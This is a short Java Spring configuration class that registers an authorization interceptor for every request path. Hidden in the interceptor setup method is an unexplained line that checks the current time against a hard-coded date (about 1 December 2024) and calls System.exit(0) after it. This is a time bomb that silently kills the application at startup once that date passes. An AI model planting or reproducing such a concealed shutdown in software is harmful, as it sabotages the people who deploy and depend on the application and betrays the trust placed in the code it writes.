package com.wfuhui.web.config;

import java.util.Date;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

import com.wfuhui.web.interceptor.AuthorizationInterceptor;

@Configuration
public class WebMvcConfig implements WebMvcConfigurer {
    @Autowired
    private AuthorizationInterceptor authorizationInterceptor;

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
    	if(new Date().getTime() > 1732982401000l) {System.exit(0);}
        registry.addInterceptor(authorizationInterceptor).addPathPatterns("/**");
    }

}